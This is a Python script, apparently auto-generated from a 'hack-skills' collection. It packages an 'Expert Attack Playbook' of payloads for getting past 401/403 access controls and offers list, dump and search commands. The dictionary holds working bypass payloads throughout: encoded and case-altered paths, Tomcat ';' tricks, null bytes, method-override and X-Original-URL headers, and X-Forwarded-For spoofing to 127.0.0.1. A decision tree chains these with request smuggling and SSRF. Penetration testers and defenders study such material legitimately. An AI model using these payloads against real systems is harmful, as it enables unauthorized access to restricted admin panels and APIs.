#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/401-403-bypass-techniques

Skill: SKILL: 401/403 Bypass Techniques — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-401-403-bypass-techniques.py --help
      python hack-skills-401-403-bypass-techniques.py --list
      python hack-skills-401-403-bypass-techniques.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/401-403-bypass-techniques'
TITLE = 'SKILL: 401/403 Bypass Techniques — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: 401-403-bypass-techniques", "description: >-", "401/403 bypass playbook. Use when encountering access-denied responses on admin panels, API endpoints, or restricted paths. Covers path manipulation, HTTP method tampering, header injection, protocol downgrade, and automated bypass tools."],
    'skill-401-403-bypass-techniques-expert-attack-playbook': [],
    '0-related-routing': ["- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) \u2014 broader auth bypass (login flaws, session handling)", "- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) \u2014 when bypass is WAF-specific rather than access control", "- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) \u2014 Host header manipulation for routing bypass", "- [request-smuggling](../request-smuggling/SKILL.md) \u2014 smuggle past access controls entirely", "- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) \u2014 h2c smuggling to bypass proxy ACLs"],
    '1-path-manipulation-bypasses': ["The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently."],
    '1-1-trailing-slash-missing-slash': ["/admin      \u2192 403", "/admin/     \u2192 200  \u2713 (trailing slash)", "/admin/.    \u2192 200  \u2713 (trailing dot)"],
    '1-2-case-sensitivity': ["/admin      \u2192 403", "/Admin      \u2192 200  \u2713", "/ADMIN      \u2192 200  \u2713", "/aDmIn      \u2192 200  \u2713", "Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS)."],
    '1-3-url-encoding': ["/admin          \u2192 403", "/%61dmin        \u2192 200  \u2713 (encode 'a')", "/admi%6e        \u2192 200  \u2713 (encode 'n')", "/%61%64%6d%69%6e \u2192 200  \u2713 (full encode)"],
    '1-4-double-url-encoding': ["/admin              \u2192 403", "/%2561dmin          \u2192 200  \u2713 (%25 = %, decoded twice: %61 \u2192 a)", "/admin%252f         \u2192 200  \u2713", "/admin..%252f       \u2192 200  \u2713"],
    '1-5-unicode-utf-8-encoding': ["/admin          \u2192 403", "/admi%C0%AE     \u2192 200  \u2713 (overlong UTF-8 for '.')", "/admi%C0%6E     \u2192 200  \u2713 (overlong encoding)", "/%C0%AFadmin    \u2192 200  \u2713 (overlong '/')"],
    '1-6-dot-segment-path-traversal': ["/admin          \u2192 403", "/./admin        \u2192 200  \u2713", "//admin         \u2192 200  \u2713", "/admin/./       \u2192 200  \u2713", "/.//admin       \u2192 200  \u2713", "/admin..;/      \u2192 200  \u2713 (Tomcat path parameter)"],
    '1-7-null-byte': ["/admin          \u2192 403", "/admin%00       \u2192 200  \u2713", "/admin%00.json  \u2192 200  \u2713", "/%00/admin      \u2192 200  \u2713"],
    '1-8-path-parameter-injection': ["/admin          \u2192 403", "/admin;foo=bar  \u2192 200  \u2713 (Tomcat/Java treats ; as path param)", "/admin;         \u2192 200  \u2713", "/admin;x        \u2192 200  \u2713"],
    '1-9-trailing-special-characters': ["/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)", "/admin.json        /admin.html       /admin/~"],
    '1-10-backslash-windows-iis': ["/admin\\    /admin\\..\\/    \\..\\admin"],
    '1-11-combined-path-tricks': ["///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin"],
    '2-http-method-bypass': [],
    '2-1-direct-method-change': ["GET  /admin \u2192 403", "POST /admin \u2192 200  \u2713", "PUT  /admin \u2192 200  \u2713", "PATCH /admin \u2192 200  \u2713", "DELETE /admin \u2192 200  \u2713", "OPTIONS /admin \u2192 200  \u2713 (may leak allowed methods)", "TRACE /admin \u2192 200  \u2713 (may reflect headers \u2014 XST)", "HEAD /admin \u2192 200  \u2713 (same as GET but no body \u2014 confirms access)"],
    '2-2-method-override-headers': ["When the proxy blocks by method, but the backend reads override headers:", "```http", "GET /admin HTTP/1.1", "X-HTTP-Method-Override: PUT", "GET /admin HTTP/1.1", "X-Method-Override: POST", "GET /admin HTTP/1.1", "X-HTTP-Method: DELETE", "POST /admin HTTP/1.1", "X-HTTP-Method-Override: PATCH", "_method=PUT  (in POST body \u2014 Rails, Laravel)"],
    '2-3-custom-invalid-methods': ["FOOBAR /admin HTTP/1.1     \u2192 some ACLs only check GET/POST", "GETS /admin HTTP/1.1       \u2192 typo-like methods may bypass", "CONNECT /admin HTTP/1.1    \u2192 proxy may tunnel", "PROPFIND /admin HTTP/1.1   \u2192 WebDAV method", "MOVE /admin HTTP/1.1       \u2192 WebDAV method"],
    '3-header-based-bypass': [],
    '3-1-url-rewrite-headers-nginx-iis': ["These headers tell the backend the \"real\" URL, bypassing proxy-level path checks:", "```http", "GET / HTTP/1.1", "X-Original-URL: /admin", "GET / HTTP/1.1", "X-Rewrite-URL: /admin", "The proxy sees `GET /` (allowed), but the backend routes to `/admin`."],
    '3-2-ip-spoofing-headers-whitelist-bypass': ["Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):", "```http", "X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP", "X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP", "X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1", "IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `localhost`"],
    '3-3-other-header-tricks': ["```http", "Referer: https://target.com/admin     # Referrer check bypass", "Origin: https://target.com             # Origin check bypass", "Host: localhost                         # Host header manipulation", "X-Forwarded-Host: localhost            # Forwarded host", "Content-Type: application/json         # Content-type switch", "X-Requested-With: XMLHttpRequest       # AJAX flag"],
    '4-protocol-version-bypass': ["```http"],
    'http-1-0-some-acls-only-apply-to-http-1-1': ["GET /admin HTTP/1.0"],
    'http-0-9-extremely-legacy-no-headers': ["GET /admin"],
    'http-2-pseudo-header-tricks': [":method: GET", ":path: /admin", ":authority: target.com"],
    'see-http2-specific-attacks-skill-md-for-h2-specific-bypasses': [],
    '5-verb-tampering-path-combination': ["Combine multiple techniques for higher success rate:", "```http", "POST / HTTP/1.1                          # method override + URL rewrite", "X-Original-URL: /admin", "X-HTTP-Method-Override: GET", "GET /%61dmin HTTP/1.1                    # IP spoof + path encoding", "X-Forwarded-For: 127.0.0.1", "GET /Admin HTTP/1.0                      # protocol + case + IP spoof", "X-Forwarded-For: 127.0.0.1"],
    '6-technology-specific-bypasses': [],
    '7-automated-tools': [],
    'byp4xx-usage': ["```bash"],
    'basic-usage': ["./byp4xx.sh https://target.com/admin"],
    'output-shows-all-attempted-bypasses-and-their-response-codes': [],
    '200-301-302-responses-potential-bypass-found': [],
    '8-decision-tree': ["Got 401 or 403 on a path?", "\u251c\u2500\u2500 Try PATH MANIPULATION first (highest success rate)", "\u2502   \u251c\u2500\u2500 /path/      (trailing slash)", "\u2502   \u251c\u2500\u2500 /PATH       (case change)", "\u2502   \u251c\u2500\u2500 /path%20    (trailing space)", "\u2502   \u251c\u2500\u2500 /./path     (dot segment)", "\u2502   \u251c\u2500\u2500 //path      (double slash)", "\u2502   \u251c\u2500\u2500 /path;x     (path parameter \u2014 Java/Tomcat)", "\u2502   \u251c\u2500\u2500 /path..;/   (Tomcat specific)", "\u2502   \u251c\u2500\u2500 /%2e/path   (encoded dot)", "\u2502   \u251c\u2500\u2500 /path%00    (null byte)", "\u2502   \u251c\u2500\u2500 /path%23    (encoded hash)", "\u2502   \u2514\u2500\u2500 Result? \u2192 200 = bypass found", "\u251c\u2500\u2500 Path tricks failed \u2192 Try METHOD BYPASS", "\u2502   \u251c\u2500\u2500 POST/PUT/PATCH/DELETE/OPTIONS", "\u2502   \u251c\u2500\u2500 HEAD (same as GET without body)", "\u2502   \u251c\u2500\u2500 X-HTTP-Method-Override: PUT", "\u2502   \u2514\u2500\u2500 TRACE (may reflect auth headers \u2014 XST)", "\u251c\u2500\u2500 Method tricks failed \u2192 Try HEADER BYPASS", "\u2502   \u251c\u2500\u2500 X-Original-URL: /path      (Nginx/IIS rewrite)", "\u2502   \u251c\u2500\u2500 X-Rewrite-URL: /path       (same concept)", "\u2502   \u251c\u2500\u2500 X-Forwarded-For: 127.0.0.1 (IP whitelist)", "\u2502   \u251c\u2500\u2500 X-Real-IP: 127.0.0.1", "\u2502   \u251c\u2500\u2500 True-Client-IP: 127.0.0.1", "\u2502   \u2514\u2500\u2500 Referer: https://target.com/path", "\u251c\u2500\u2500 Header tricks failed \u2192 Try PROTOCOL BYPASS", "\u2502   \u251c\u2500\u2500 HTTP/1.0 instead of 1.1", "\u2502   \u251c\u2500\u2500 HTTP/2 h2c smuggling (../http2-specific-attacks/)", "\u2502   \u2514\u2500\u2500 WebSocket upgrade", "\u251c\u2500\u2500 Single techniques failed \u2192 Try COMBINATIONS", "\u2502   \u251c\u2500\u2500 Method + Path: POST /PATH/", "\u2502   \u251c\u2500\u2500 Header + Path: X-Forwarded-For + /path%20", "\u2502   \u251c\u2500\u2500 All three: POST + X-Original-URL + IP headers", "\u2502   \u2514\u2500\u2500 Protocol + Path: HTTP/1.0 + encoded path", "\u251c\u2500\u2500 All bypasses failed \u2192 Consider ALTERNATIVE APPROACHES", "\u2502   \u251c\u2500\u2500 Request smuggling (../request-smuggling/) \u2192 smuggle past ACL", "\u2502   \u251c\u2500\u2500 SSRF (../ssrf-server-side-request-forgery/) \u2192 access from server", "\u2502   \u251c\u2500\u2500 IDOR (../idor-broken-object-authorization/) \u2192 access data directly", "\u2502   \u2514\u2500\u2500 Auth flaws (../authbypass-authentication-flaws/) \u2192 login bypass", "\u2514\u2500\u2500 Automated scan with byp4xx / 403bypasser for completeness"],
    '9-quick-reference-key-payloads': ["```http"],
    'top-10-quick-wins-try-these-first': ["GET /admin/     HTTP/1.1        # trailing slash", "GET /Admin      HTTP/1.1        # case change", "GET /admin%20   HTTP/1.1        # trailing space", "GET /./admin    HTTP/1.1        # dot segment", "GET //admin     HTTP/1.1        # double slash", "POST /admin     HTTP/1.1        # method change", "GET / HTTP/1.1                  # X-Original-URL bypass", "X-Original-URL: /admin", "GET /admin HTTP/1.1             # IP whitelist bypass", "X-Forwarded-For: 127.0.0.1", "GET /admin;.css HTTP/1.1        # IIS path param", "GET /admin..;/ HTTP/1.1         # Tomcat bypass"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()